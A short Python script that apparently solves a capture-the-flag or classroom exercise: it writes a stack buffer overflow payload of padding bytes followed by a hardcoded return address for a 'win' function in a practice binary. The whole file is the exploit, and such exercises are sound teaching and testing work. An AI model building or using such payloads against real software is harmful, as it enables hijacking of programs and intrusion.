import struct

def pack32(number):
    # little endian 32 bit version of passed number
    # this is the hardcoded address for the 'win' function in main.c
    # the address was copied from the objdump
    return struct.pack("<I", number)

def generate_payload():
    f = open("./payload", "wb")
    payload = b"A"*32
    payload += b"BBBB"
    payload += b"CCCC"
    payload += b"DDDD"
    payload += pack32(0x08049176)
    f.write(payload)
    f.close()

def main():
    generate_payload()


if __name__ == "__main__":
    main()
